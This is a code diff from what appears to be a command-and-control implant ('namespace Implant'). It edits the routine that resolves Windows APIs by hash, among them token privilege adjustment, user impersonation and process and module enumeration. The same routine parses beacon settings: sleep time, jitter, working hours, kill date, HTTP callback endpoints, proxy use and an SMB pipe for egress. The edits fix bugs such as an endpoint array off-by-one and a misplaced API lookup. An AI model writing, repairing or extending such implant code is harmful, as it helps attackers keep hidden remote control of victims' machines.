@@ -67,8 +67,6 @@ namespace Implant {
         else {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
-
-        __debugbreak();
         if (
             !F_PTR_HMOD(Ctx->win32.FreeLibrary,                     Ctx->modules.kernel32, FREELIBRARY) ||
             !F_PTR_HMOD(Ctx->win32.Heap32ListFirst,                 Ctx->modules.kernel32, HEAP32LISTFIRST) ||
@@ -86,7 +84,6 @@ namespace Implant {
             !F_PTR_HMOD(Ctx->win32.Module32Next,                    Ctx->modules.kernel32, MODULE32NEXT) ||
             !F_PTR_HMOD(Ctx->win32.GetCurrentProcessId,             Ctx->modules.kernel32, GETCURRENTPROCESSID) ||
             !F_PTR_HMOD(Ctx->win32.GetProcessId,                    Ctx->modules.kernel32, GETPROCESSID) ||
-            !F_PTR_HMOD(Ctx->win32.AdjustTokenPrivileges,           Ctx->modules.kernel32, ADJUSTTOKENPRIVILEGES) ||
             !F_PTR_HMOD(Ctx->win32.GlobalMemoryStatusEx,            Ctx->modules.kernel32, GLOBALMEMORYSTATUSEX) ||
             !F_PTR_HMOD(Ctx->win32.GetComputerNameExA,              Ctx->modules.kernel32, GETCOMPUTERNAMEEXA) ||
             !F_PTR_HMOD(Ctx->win32.SetLastError,                    Ctx->modules.kernel32, SETLASTERROR) ||
@@ -144,6 +141,7 @@ namespace Implant {
             !F_PTR_HMOD(Ctx->win32.GetAdaptersInfo,                 Ctx->modules.iphlpapi, GETADAPTERSINFO) ||
             !F_PTR_HMOD(Ctx->win32.CryptStringToBinaryA,            Ctx->modules.crypt32, CRYPTSTRINGTOBINARYA) ||
             !F_PTR_HMOD(Ctx->win32.CryptBinaryToStringA,            Ctx->modules.crypt32, CRYPTBINARYTOSTRINGA) ||
+            !F_PTR_HMOD(Ctx->win32.AdjustTokenPrivileges,           Ctx->modules.advapi, ADJUSTTOKENPRIVILEGES) ||
             !F_PTR_HMOD(Ctx->win32.ImpersonateLoggedOnUser,         Ctx->modules.advapi, IMPERSONATELOGGEDONUSER) ||
             !F_PTR_HMOD(Ctx->win32.GetUserNameA,                    Ctx->modules.advapi, GETUSERNAMEA) ||
             !F_PTR_HMOD(Ctx->win32.LookupAccountSidW,               Ctx->modules.advapi, LOOKUPACCOUNTSIDW) ||
@@ -159,13 +157,13 @@ namespace Implant {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
 
+        Ctx->transport.outbound_queue = nullptr;
+
         Ctx->session.peer_id    = Parser::UnpackDword(&parser);
         Ctx->config.sleeptime   = Parser::UnpackDword(&parser);
         Ctx->config.jitter      = Parser::UnpackDword(&parser);
         Ctx->config.hours       = Parser::UnpackDword(&parser);
         Ctx->config.killdate    = Parser::UnpackDword64(&parser);
-
-        Ctx->transport.outbound_queue = nullptr;
 
 #ifdef TRANSPORT_HTTP
         Ctx->transport.http = S_CAST(_http_context*, x_malloc(sizeof(_http_context)));
@@ -179,15 +177,16 @@ namespace Implant {
         Ctx->transport.http->port = S_CAST(int, Parser::UnpackDword(&parser));
 
         Ctx->transport.http->n_endpoints = Parser::UnpackDword(&parser);
-        Ctx->transport.http->endpoints  = S_CAST(wchar_t**, x_malloc(sizeof(wchar_t*) * ((Ctx->transport.http->n_endpoints + 1) * 2)));
+        Ctx->transport.http->endpoints  = S_CAST(wchar_t**, x_malloc(sizeof(wchar_t*) * ((Ctx->transport.http->n_endpoints + 1))));
 
         for (auto i = 0; i < Ctx->transport.http->n_endpoints; i++) {
             Parser::ParserWcscpy(&parser, &Ctx->transport.http->endpoints[i], nullptr);
         }
 
-        Ctx->transport.http->endpoints[Ctx->transport.http->n_endpoints + 1] = nullptr;
+        __debugbreak();
+        Ctx->transport.http->endpoints[Ctx->transport.http->n_endpoints] = nullptr;
 
-        Parser::ParserStrcpy(&parser, &Ctx->transport.domain, nullptr  );
+        Parser::ParserStrcpy(&parser, &Ctx->transport.domain, nullptr);
         Ctx->transport.b_proxy = Parser::UnpackBool(&parser);
 
         if (Ctx->transport.b_proxy) {
@@ -203,9 +202,9 @@ namespace Implant {
         }
 #endif
 #ifdef TRANSPORT_PIPE
-        Ctx->egress_pipe = R_CAST(_smb_context*, x_malloc(sizeof(_smb_context)));
-        Parser::ParserWcscpy(&parser, &Ctx->config.egress_pipe, nullptr);
+        Parser::ParserWcscpy(&parser, &Ctx->transport.pipe_name, nullptr);
 #endif
+
     defer:
         Parser::DestroyParser(&parser);
     }
